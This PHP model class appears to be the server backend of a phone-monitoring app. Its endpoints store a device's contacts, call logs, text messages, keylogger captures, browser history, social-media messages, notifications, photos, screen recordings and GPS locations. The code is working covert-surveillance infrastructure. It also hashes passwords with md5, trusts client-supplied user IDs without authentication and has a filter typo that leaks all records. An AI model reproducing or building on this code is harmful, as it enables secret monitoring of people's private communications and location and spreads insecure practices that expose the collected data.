<?php
class Api_model extends My_model{
    
    public function __construct() {
        parent::__construct();
    }
    
    /*User Register*/
    
    public function singup($postData){
        $data['where'] = ['email' => $postData['email']];
        $data['table'] = TABLE_USER;
        $result = $this->selectRecords($data);
        
        if (!empty($result)) {
            $arr = [0, 'User Already Register'];
        }else{
            $data['insert']['user_name'] = $postData['username'];
            $data['insert']['email'] = $postData['email'];
            $data['insert']['password'] = md5($postData['password']);
            $data['insert']['phone_no'] = $postData['phone'];
            $data['insert']['type'] = '2';
            $data['insert']['notification_type'] = '1';
            $data['insert']['created_date'] = DATE_TIME;
            $data['insert']['updated_date'] = DATE_TIME;
            $data['table'] = TABLE_USER;
            $responseId = $this->insertRecord($data);
            
            unset($data);
            
            if($responseId){
                $chekcDevice = $this->checkDevice($postData['device_id']);
                
                if (!empty($chekcDevice)) {

                    $data['update']['user_id'] = $responseId;
                    $data['update']['device_id'] = $postData['device_id'];
                    $data['update']['token'] = $postData['device_token'];
                    $data['update']['type'] = $postData['device_type'];
                    $data['update']['device_name'] = $postData['device_name'];
                    $data['update']['dt_updated'] = date('Y-m-d h:i:s');
                    $data['where'] = ['device_id' => $postData['device_id']];
                    $data['table'] = TABLE_DEVICE;
                    $result = $this->updateRecords($data);
                } else {

                    $data['insert']['user_id'] = $responseId;
                    $data['insert']['device_id'] = $postData['device_id'];
                    $data['insert']['token'] = $postData['device_token'];
                    $data['insert']['type'] = $postData['device_type'];
                    $data['insert']['device_name'] = $postData['device_name'];
                    $data['insert']['dt_updated'] = date('Y-m-d h:i:s');
                    $data['table'] = TABLE_DEVICE;
                    $result = $this->insertRecord($data);
                }
                
                unset($data);
                
                $data = array(
                    'id' => $responseId,
                    'user_name' => $postData['username'],
                    'email' => $postData['email'],
                    'phone' => $postData['phone'],
                );
                
                $arr = [1,'User register successfully',$data,'data'];
            }
            
            $response = $this->utility->sentResponse($arr);
            return $response;
        }
    }
    
    /*User Login*/
    
    public function login($postData){
        if(($postData['user_pin'])){
            $data['select'] = ['id','user_name','email','phone_no','monitoring_status','app_setting'];
            $data['where'] = ['user_pin' => $postData['user_pin']];
            $data['table'] = TABLE_USER;
            $result = $this->selectRecords($data);
            
            if(!empty($result)){
                $applicationData = $this->getApplicationData($result[0]->id);
                $result[0]->application_data = $applicationData;
                $chekcDevice = $this->checkDevice($postData['device_id']);
//
                if (!empty($chekcDevice)) {

                    $data['update']['user_id'] = $result[0]->id;
                    $data['update']['device_id'] = $postData['device_id'];
                    $data['update']['token'] = $postData['device_token'];
                    $data['update']['type'] = $postData['device_type'];
                    $data['update']['device_name'] = $postData['device_name'];
                    $data['update']['dt_updated'] = date('Y-m-d h:i:s');
                    $data['where'] = ['device_id' => $postData['device_id']];
                    $data['table'] = TABLE_DEVICE;
                    $res = $this->updateRecords($data);
                    
                } else {

                    $data['insert']['user_id'] = $result[0]->id;
                    $data['insert']['device_id'] = $postData['device_id'];
                    $data['insert']['token'] = $postData['device_token'];
                    $data['insert']['type'] = $postData['device_type'];
                    $data['insert']['device_name'] = $postData['device_name'];
                    $data['insert']['dt_updated'] = date('Y-m-d h:i:s');
                    $data['table'] = TABLE_DEVICE;
                    $res = $this->insertRecord($data);
                    
                }
                
                $arr = ['1','Login Successfully',$result,'data'];
            }else{
                $arr = ['0','Invalid email or password'];
            }   
        }else{
            $arr = ['0','Invalid data'];
        }
        
        $response = $this->utility->sentResponse($arr);
        return $response;
    }
    
    function getApplicationData($id){
        $data['select'] = ['a.name','au.status'];
        $data['table'] = TABLE_USER_HAS_APPLICATION . ' au';
        $data['join'] = [
            TABLE_APPLICATION . " as a" => [
                "a.id = au.app_id",
                "LEFT"
            ],
        ];
        $data['where'] = ['au.user_id' => $id];
        $applicationList = $this->selectFromJoin($data);
        $applicationList = json_encode($applicationList);
        return $applicationList;
    }


    /*Contact Import*/
    
    function contact_import($postData){
       
        if(($postData['user_id']) && (!empty($postData['contact_list']))){
            
            for($i=0; $i<count($postData['contact_list']); $i++){
                $contactNumber = $this->removeChars($postData['contact_list'][$i]['phone_number']);
                $checkContact = $this->contactCheck($postData['user_id'],$contactNumber);
                
                if(empty($checkContact)){
                    
                    $data['insert']['user_id'] = $postData['user_id'];
                    $data['insert']['name'] = $postData['contact_list'][$i]['name'];
                    $data['insert']['number'] = $contactNumber;
                    $data['insert']['email'] = $postData['contact_list'][$i]['email'];
                    $data['insert']['url'] = $postData['contact_list'][$i]['url'];
                    $data['insert']['company'] = $postData['contact_list'][$i]['company'];
                    $data['insert']['address'] = $postData['contact_list'][$i]['address'];
                    $data['insert']['dt_created'] = DATE_TIME;
                    $data['insert']['dt_updated'] = DATE_TIME;
                    $data['table'] = TABLE_CONTACT;
                    $result = $this->insertRecord($data);
                    
                } else {
                    
                    $data['update']['name'] = $postData['contact_list'][$i]['name'];
                    $data['update']['number'] = $contactNumber; 
                    $data['update']['email'] = $postData['contact_list'][$i]['email'];
                    $data['update']['url'] = $postData['contact_list'][$i]['url'];
                    $data['update']['company'] = $postData['contact_list'][$i]['company'];
                    $data['update']['address'] = $postData['contact_list'][$i]['address'];
                    $data['update']['dt_updated'] = DATE_TIME;
                    $data['where'] = ['user_id' =>  $postData['user_id'], 'number' => $postData['contact_list'][$i]['phone_number']];
                    $data['table'] = TABLE_CONTACT;
                    $result = $this->updateRecords($data);
                    
                }
            }
            if($result){
                $arr = ['1','contact import successfully'];
            }else{
                $arr = ['0','something went wrong'];
            }
        }else{
            $arr = ['0','Invalid data'];
        }
        
        $response = $this->utility->sentResponse($arr);
        return $response;
    }
    
    function removeChars($contactNo){
         $contact = str_replace([" ","  ","-","_","/","\/",".","(",")","[","]","{","}","*","#"], ['','','','','','','','','','','','','','',''], $contactNo);
            
         $phoneRemovedZero = trim(ltrim($contact, '0'));
         $phoneRemovedZero = preg_replace('/\xc2\xa0/', '', $phoneRemovedZero);
         
         if (substr($phoneRemovedZero, 0, strlen('+91')) == '+91') {
            $phoneRemovedZero = substr($phoneRemovedZero, strlen('+91'));
         } 
         
         return $phoneRemovedZero;
        
    }
    
    function contactCheck($userId,$number){
        $data['select'] = ['id','name','number'];
        $data['where'] = ['user_id' => $userId ,'number' => $number];
        $data['table'] = TABLE_CONTACT;
        $result = $this->selectRecords($data);
        return $result;
    }


    /*Contact Import List*/
    
    function contact_list($postData){
        if($postData['user_id']){
            $data['select'] = ['id','name','number','email','url','address','company','dt_created'];
            $data['where'] = ['user_id' => $postData['user_id']];
            $data['table'] = TABLE_CONTACT;
            $result = $this->selectRecords($data);
            if($result){
                $arr = ['1','Contact data',$result,'data'];
            }else{
                $arr = ['0','Contact list not found'];
            }
        }else{
            $arr = ['0','Invalid data'];
        }
        
        $response = $this->utility->sentResponse($arr);
        return $response;
    }
    
    /*Contact Import Edit*/
            
    function contact_edit($postData){
        if(($postData['user_id']) && (!empty($postData['contact_list']))){
            
            for($i=0; $i<count($postData['contact_list']); $i++){
                
                $data['update']['name'] = $postData['contact_list'][$i]['name'];
                $data['update']['number'] = $postData['contact_list'][$i]['phone_number'];
                $data['update']['email'] = $postData['contact_list'][$i]['email'];
                $data['update']['url'] = $postData['contact_list'][$i]['url'];
                $data['update']['company'] = $postData['contact_list'][$i]['company'];
                $data['update']['address'] = $postData['contact_list'][$i]['address'];
                $data['update']['dt_updated'] = DATE_TIME;
                $data['where'] = ['id' => $postData['contact_list'][$i]['id'] , 'user_id' => $postData['user_id']];
                $data['table'] = TABLE_CONTACT;
                $result = $this->updateRecords($data);
            }
            
            if($result){
                $arr = ['1','contact edit successfully'];
            }else{
                $arr = ['0','something went wrong'];
            }
            
        }else{
            $arr = ['0','Invalid data'];
        }
        
        $response = $this->utility->sentResponse($arr);
        return $response;
    }
    
    /*Call Import*/
    
    function addCallList($postData){
        
        if(($postData['user_id']) && (!empty($postData['call_list']))){
            for($i = 0; $i < count($postData['call_list']); $i++){
                
                $checkAlready = $this->checkTimeStamp(TABLE_CALL_LOG,$postData['call_list'][$i]['time_stamp'],$postData['user_id']);

                if(empty($checkAlready)){
                    
                    if($postData['call_list'][$i]['call_type'] == 'MISSED'){
                        $type = 'missedcall';
                    }else{
                        $type = $postData['call_list'][$i]['call_type'];
                    }
                    
                    $data['insert']['user_id'] = $postData['user_id'];
                    $data['insert']['name'] = $postData['call_list'][$i]['name'];
                    $data['insert']['number'] = $postData['call_list'][$i]['number'];
                    $data['insert']['duration'] = $postData['call_list'][$i]['duration'];
                    $data['insert']['date'] = date('Y-m-d', strtotime($postData['call_list'][$i]['date_time']));
                    $data['insert']['time'] = date('H:i:s', strtotime($postData['call_list'][$i]['date_time']));
                    $data['insert']['date_time'] = date('Y-m-d H:i:s', strtotime($postData['call_list'][$i]['date_time']));
                    $data['insert']['time_stamp'] = $postData['call_list'][$i]['time_stamp'];
                    $data['insert']['call_type']  = $type;
                    $data['insert']['dt_created'] = DATE_TIME;
                    $data['insert']['dt_updated'] = DATE_TIME;
                    $data['table'] = TABLE_CALL_LOG;
                    $result = $this->insertRecord($data);
                    
                } else {
                    
                    $result = 1;
                }                
            }
            
            if($result){
                $arr = ['1','call list import successfully'];
            }else{
                $arr = ['0','something went wrong'];
            }
            
        }else{
            $arr = ['0','Invalid data'];
        }
        
        $response = $this->utility->sentResponse($arr);
        return $response;
        
    }
    
    /*check TimeStamp*/
    
    function checkTimeStamp($table,$timeStamp,$user_id,$type = NULL){
        $data['select'] = ['id'];
        if($type){
         $data['where'] = ['user_id' => $user_id,'time_stamp' => $timeStamp , 'type' => $type];   
        }else{
         $data['where'] = ['user_id' => $user_id,'time_stamp' => $timeStamp];
        }
        $data['table'] = $table;
        $result = $this->selectRecords($data);
        return $result;
    }

    /*User Appplication Add*/
    
    function userApplication($postData){
        
        if(!empty($postData['name'])){
            $uploadPath = 'public/upload/app_icons/';
            
            $config['upload_path'] = $uploadPath;
            $config['allowed_types'] = 'gif|jpg|png|jpeg';
            $this->load->library('upload');
            $files = $_FILES;
            for($i=0; $i<count($postData['name']); $i++){
            
                $_FILES['userfile']['name'] = $files['icon']['name'][$i];
                $_FILES['userfile']['type'] = $files['icon']['type'][$i];
                $_FILES['userfile']['tmp_name'] = $files['icon']['tmp_name'][$i];
                $_FILES['userfile']['error'] = $files['icon']['error'][$i];
                $_FILES['userfile']['size'] = $files['icon']['size'][$i];
                $config['file_name'] = 'icon_' . time();
                
                $this->upload->initialize($config);
                
                if ($this->upload->do_upload()) {
                    $imgUpload = $this->upload->data();
                    
                    $data['insert']['name'] = $postData['name'][$i];
                    $data['insert']['icon'] =  $imgUpload['file_name'];
                    $data['insert']['status'] = '0';
                    $data['insert']['dt_created'] = DATE_TIME;
                    $data['insert']['dt_updated'] = DATE_TIME;
                    $data['table'] = TABLE_APPLICATION;
                    $result = $this->insertRecord($data);
                    
                }
            }
            
            if($result){
                $arr = ['1','application successfully import'];
            }else{
                $arr = ['0','something went wrong'];
            }
            
        }else{
            $arr = ['0','Invalid data'];
        }
        
        $response = $this->utility->sentResponse($arr);
        return $response;
    }
    
    /*User Appplication List*/
    
    function userApplicationList($postData){
        if($postData['user_id']){
            $imageUrl = base_url().'public/upload/app_icons/';
            $data['select'] = ['id','name','CONCAT("'.$imageUrl.'",icon) as appIcone'];
            $data['weher'] = ['user_id' => $postData['user_id']];
            $data['table'] = TABLE_APPLICATION;
            $result = $this->selectRecords($data);
            if(!empty($result)){
                $arr = ['1','application list',$result,'data'];
            }else{
                $arr = ['0','no application found for this user'];
            }
        }else{
            $arr = ['0','Invalid data'];
        }
        
        $response = $this->utility->sentResponse($arr);
        return $response;
    }
    
    /*Import Message*/
            
    function addMessageList($postData){
        
        if(($postData['user_id']) && (!empty($postData['message_list']))){
            for($i =0; $i<count($postData['message_list']); $i++){
                
                $checkAlready = $this->checkTimeStamp(TABLE_MESSAGE,$postData['message_list'][$i]['time_stamp'],$postData['user_id']);
                
                if(empty($checkAlready)){
                    
                    $data['insert']['user_id'] = $postData['user_id'];
                    $data['insert']['name'] = $postData['message_list'][$i]['name'];
                    $data['insert']['number'] = $postData['message_list'][$i]['number'];
                    $data['insert']['time'] = date('H:i:s', strtotime($postData['message_list'][$i]['date_time']));
                    $data['insert']['date'] = date('Y-m-d', strtotime($postData['message_list'][$i]['date_time']));
                    $data['insert']['date_time'] = date('Y-m-d H:i:s', strtotime($postData['message_list'][$i]['date_time']));
                    $data['insert']['text'] = $postData['message_list'][$i]['text'];
                    $data['insert']['type'] = $postData['message_list'][$i]['type'];
                    $data['insert']['time_stamp'] = $postData['message_list'][$i]['time_stamp'];
                    $data['insert']['dt_created'] = DATE_TIME;
                    $data['insert']['dt_updated'] = DATE_TIME;
                    $data['table'] = TABLE_MESSAGE;
                    $result = $this->insertRecord($data);
                    
                }else{
                    
                    $result = 1;
                }
            }
            
            if($result){
                $arr = ['1','message import successfully'];
            }else{
                $arr = ['0','Something went wrong'];
            }
        }else{
            $arr = ['0','Invalid data'];
        }
        
        $response = $this->utility->sentResponse($arr);
        return $response;
    }

    /*Import Key Logger*/
    
    function addKeyLogger($postData){
        if(($postData['user_id']) && (!empty($postData['key_logger']))){
            for($i=0; $i<count($postData['key_logger']); $i++){
                
                $checkAlready = $this->checkTimeStamp(TABLE_KEY_LOGGER,$postData['key_logger'][$i]['time_stamp'],$postData['user_id']);
                
                if(empty($checkAlready)){
                   
                    $data['insert']['user_id'] = $postData['user_id'];
                    $data['insert']['application_name'] = $postData['key_logger'][$i]['application_name'];
                    $data['insert']['text'] = $postData['key_logger'][$i]['text'];
                    $data['insert']['date'] = date('Y-m-d', strtotime($postData['key_logger'][$i]['date_time']));
                    $data['insert']['time'] = date('H:i:s', strtotime($postData['key_logger'][$i]['date_time']));
                    $data['insert']['date_time'] = date('Y-m-d H:i:s', strtotime($postData['key_logger'][$i]['date_time']));
                    $data['insert']['time_stamp'] = $postData['key_logger'][$i]['time_stamp'];
                    $data['insert']['dt_created'] = DATE_TIME;
                    $data['insert']['dt_updated'] = DATE_TIME;
                    $data['table'] = TABLE_KEY_LOGGER;
                    $result = $this->insertRecord($data);
                    
                } else {                    
                    $result = 1;
                }
                
            }
            if($result){
                $arr = ['1','key logger import successfully'];
            }else{
                $arr = ['0','something went wrong'];
            }
        }else{
            $arr = ['0','Invalid data'];
        }
        
        $response = $this->utility->sentResponse($arr);
        return $response;
    }
    
    /*Import Browser history*/
    
    function addBrowserHistory($postData){
        if(($postData['user_id']) && (!empty($postData['browser_history']))){
            
            for($i=0; $i<count($postData['browser_history']); $i++){
                
                $checkAlready = $this->checkTimeStamp(TABLE_BROWSER_HISTORY,$postData['browser_history'][$i]['time_stamp'],$postData['user_id']);
                
                if(empty($checkAlready)){
                    
                    $data['insert']['user_id'] = $postData['user_id'];
                    $data['insert']['title'] = $postData['browser_history'][$i]['title'];
                    $data['insert']['url'] = $postData['browser_history'][$i]['url'];
                    $data['insert']['is_bookmark'] = $postData['browser_history'][$i]['is_bookmark'];
                    $data['insert']['date'] = date('Y-m-d', strtotime($postData['browser_history'][$i]['date_time']));
                    $data['insert']['time'] = date('H:i:s', strtotime($postData['browser_history'][$i]['date_time']));
                    $data['insert']['date_time'] = date('Y-m-d H:i:s', strtotime($postData['browser_history'][$i]['date_time']));
                    $data['insert']['time_stamp'] = $postData['browser_history'][$i]['time_stamp'];
                    $data['insert']['dt_created'] = DATE_TIME;
                    $data['insert']['dt_updated'] = DATE_TIME;
                    $data['table'] = TABLE_BROWSER_HISTORY;
                    $result = $this->insertRecord($data);
                } else {
                    $result = 1;           
                }
            }
            
            if($result){
                $arr = ['1','browser history import successfully'];
            }else{
                $arr = ['0','something went wrong'];
            }
        }else{
            $arr = ['0','Invalid data'];
        }
        
        $response = $this->utility->sentResponse($arr);
        return $response;
    }
    
    /*Import Social Media*/
    
    function addSocialMedia($postData){
        
        if(($postData['user_id']) && (!empty($postData['social_list']))){
            
            for($i=0; $i<count($postData['social_list']); $i++){
                
                $checkAlready = $this->checkTimeStamp(TABLE_SOCIAL_MEDIA,$postData['social_list'][$i]['time_stamp'],$postData['user_id']);
                
                if(empty($checkAlready)){
                    
                   $applicationId = $this->getApplicationId($postData['social_list'][$i]['application_name']);

                   $data['insert']['user_id'] = $postData['user_id'];
                   $data['insert']['application_id'] = $applicationId;
                   $data['insert']['package_name'] = $postData['social_list'][$i]['package_name'];
                   $data['insert']['text'] = $postData['social_list'][$i]['text'];
                   $data['insert']['date'] = date('Y-m-d', strtotime($postData['social_list'][$i]['date_time']));
                   $data['insert']['time'] = date('H:i:s',strtotime($postData['social_list'][$i]['date_time']));
                   $data['insert']['date_time'] = date('Y-m-d H:i:s',strtotime($postData['social_list'][$i]['date_time']));
                   $data['insert']['sender_name'] = $postData['social_list'][$i]['sender_name'];
                   $data['insert']['time_stamp'] = $postData['social_list'][$i]['time_stamp'];
                   $data['insert']['dt_created'] = DATE_TIME;
                   $data['insert']['dt_updated'] = DATE_TIME;
                   $data['table'] = TABLE_SOCIAL_MEDIA;
                   $result = $this->insertRecord($data);
                   
                } else {
                    $result = 1;
                } 
            }
            
            if($result){
                $arr = ['1','Social medai import successfully'];
            }else{
                $arr = ['0','Something went wrong'];
            }
        }else{
            $arr = ['0','Invalid data'];
        }
        
        $response = $this->utility->sentResponse($arr);
        return $response;
    }
    
    function getApplicationId($appName){
        $data['select'] = ['id','name'];
        $data['where'] = ['name' => $appName];
        $data['table'] = TABLE_APPLICATION;
        $result = $this->selectRecords($data);
        
        return $result[0]->id;
    }

    
    /*Import Notification*/
    
    function addNotification($postData){
        if(($postData['user_id']) && (!empty($postData['notification_list']))){
            
            for($i=0; $i<count($postData['notification_list']); $i++){
                
                $checkAlready = $this->checkTimeStamp(TABLE_NOTIFICATION,$postData['notification_list'][$i]['time_stamp'],$postData['user_id']);
                
                if(empty($checkAlready)){
                    
                    $applicationId = $this->getApplicationId($postData['notification_list'][$i]['application_name']);
                
                    $data['insert']['user_id'] = $postData['user_id'];
                    $data['insert']['application_id'] = $applicationId;
                    $data['insert']['text'] = $postData['notification_list'][$i]['text'];
                    $data['insert']['date'] = date('Y-m-d', strtotime($postData['notification_list'][$i]['date_time']));
                    $data['insert']['time'] = date('H:i:s',strtotime($postData['notification_list'][$i]['date_time']));
                    $data['insert']['time_stamp'] = $postData['notification_list'][$i]['time_stamp'];
                    $data['insert']['dt_created'] = DATE_TIME;
                    $data['insert']['dt_updated'] = DATE_TIME;
                    $data['table'] = TABLE_NOTIFICATION;
                    $result = $this->insertRecord($data);
                    
                } else {
                    
                    $result = 1;
                }                
            }
            
            if($result){
                $arr = ['1','Notification import successfully'];
            }else{
                $arr = ['0','Invalid data'];
            }
            
        }else{
            $arr = ['0','Invalid data'];
        }
        
        $response = $this->utility->sentResponse($arr);
        return $response;
    }
    
    
    /* Import Gallary & Screen Photo Where G : Gallary Pic & SP : Screen Photo*/
    
    function addGallary($postData){
        
        if($postData['user_id']){
            if(!empty($_FILES['pic'])){
                
                $checkAlready = $this->checkTimeStamp(TABLE_GALLARY,$postData['time_stamp'],$postData['user_id'],$postData['type']);
                
                if(empty($checkAlready)){
                    if ($postData['type'] == 'G') {
                        $path = 'public/upload/gallary/';
                    } else {
                        $path = 'public/upload/screen_photo/';
                    }

                    $var_image = upload_single_image($_FILES, 'pic', $path, TRUE);
                    $image = $var_image['data']['file_name'];

                    $data['insert']['user_id'] = $postData['user_id'];
                    $data['insert']['image'] = $image;
                    $data['insert']['date'] = date('Y-m-d', strtotime($postData['date_time']));
                    $data['insert']['time'] = date('H:i:s', strtotime($postData['date_time']));
                    $data['insert']['type'] = $postData['type'];
                    $data['insert']['time_stamp'] = $postData['time_stamp'];
                    $data['insert']['screen_id'] = ($postData['screen_id']) ? $postData['screen_id'] : NULL;
                    $data['insert']['dt_created'] = DATE_TIME;
                    $data['insert']['dt_updated'] = DATE_TIME;
                    $data['table'] = TABLE_GALLARY;
                    $result = $this->insertRecord($data);
                } else{
                     $result = 1;
                }
                
                
            }
            if($result){
                if($postData['type'] == 'G'){
                    $arr = ['1','Gallary import successfully'];
                }else{
                    $arr = ['1','Screen photo import successfully'];
                }
            }else{
                $arr = ['0','Something went wrong'];
            }
        }else{
            $arr = ['0','Invalid data'];
        }
        
        $response = $this->utility->sentResponse($arr);
        return $response;
    }
    
    /* Import Gallary & Screen Photo Where G : Gallary Pic & SP : Screen Photo*/
    
    function addVideo($postData){
        
        if($postData['user_id']){
            if(!empty($_FILES['video'])){
                
                $checkAlready = $this->checkTimeStamp(TABLE_VIDEO,$postData['time_stamp'],$postData['user_id'],$postData['type']);
                
                if(empty($checkAlready)){
                    if ($postData['type'] == 'V') {
                        $path = 'public/upload/videos/';
                    } else {
                        $path = 'public/upload/screen_videos/';
                    }

                    $var_image = upload_video($_FILES, 'video', $path, TRUE);
                    $video = $var_image['data']['file_name'];

                    $data['insert']['user_id'] = $postData['user_id'];
                    $data['insert']['video'] = $video;
                    $data['insert']['date'] = date('Y-m-d', strtotime($postData['date_time']));
                    $data['insert']['time'] = date('H:i:s', strtotime($postData['date_time']));
                    $data['insert']['type'] = $postData['type'];
                    $data['insert']['time_stamp'] = $postData['time_stamp'];
                    $data['insert']['screen_id'] = ($postData['screen_id']) ? $postData['screen_id'] : NULL;
                    $data['insert']['dt_created'] = DATE_TIME;
                    $data['insert']['dt_updated'] = DATE_TIME;
                    $data['table'] = TABLE_VIDEO;
                    $result = $this->insertRecord($data);
                } else {
                    $result = 1;
                }    
            }
            
            if($result){
                if($postData['type'] == 'V'){
                    $arr = ['1','Video import successfully'];
                }else{
                    $arr = ['1','Screen video import successfully'];
                }
            }else{
                $arr = ['0','Something went wrong'];
            }
        }else{
            $arr = ['0','Invalid data'];
        }
        
        $response = $this->utility->sentResponse($arr);
        return $response;
    }
    
            
    /*Check Already Contact*/
    
    function checkAlreayContact($userId,$phoneNo){
        $data['select'] = ['id','name','number'];
        $data['where'] = ['user_id' => $userId , 'number' =>  $phoneNo];
        $data['table'] = TABLE_CONTACT;
        $result = $this->selectRecords($data);
        return $result;
    }
    
    /*Check Device*/
    
    function checkDevice($postData){
        $data['select'] = ['id'];
        $data['where'] = ['device_id' => $postData];
        $data['table'] = TABLE_DEVICE;
        $result = $this->countRecords($data);
        return $result;
    }
    
    /* Geo Location */
    
    function geoLocation($postData){
        
        if(($postData['user_id']) && (!empty($postData['geo_location']))){
            
            for($i=0; $i<count($postData['geo_location']); $i++){
                
                $data['insert']['user_id'] = $postData['user_id'];
                $data['insert']['latitude'] = $postData['geo_location'][$i]['lat'];
                $data['insert']['longitude'] = $postData['geo_location'][$i]['long'];
                $data['insert']['date'] = date('Y-m-d', strtotime($postData['geo_location'][$i]['date_time']));
                $data['insert']['time'] = date('H:i:s', strtotime($postData['geo_location'][$i]['date_time']));
                $data['insert']['dt_created'] = DATE_TIME;
                $data['insert']['dt_updated'] = DATE_TIME;
                $data['table'] = TABLE_GEO_LOCATION;
                $result = $this->insertRecord($data);
                
            }
            
            if($result){
                $arr = ['1','Geo location added successfully'];
            }else{
                $arr = ['0','Something went wrong'];
            }
        }else{
            $arr = ['0','Invalid data'];
        }
        
        $response = $this->utility->sentResponse($arr);
        return $response;
    }
    
    function deviceUpdate($postData){
        
        if (($postData['user_id']) && ($postData['device_id']) && ($postData['device_token'])) {
            $data['update']['token'] = $postData['device_token'];
            $data['update']['dt_updated'] = DATE_TIME;
            $data['where'] = ['user_id' => $postData['user_id'], 'device_id' => $postData['device_id']];
            $data['table'] = TABLE_DEVICE;
            $result = $this->updateRecords($data);
            
            if($result){
                $arr = ['1','Device update successfully'];
            }else{
                $arr = ['0','Something went wrong'];
            }
        } else {
            $arr = ['0', 'Invalid data'];
        }

        $response = $this->utility->sentResponse($arr);
        return $response;
    }
}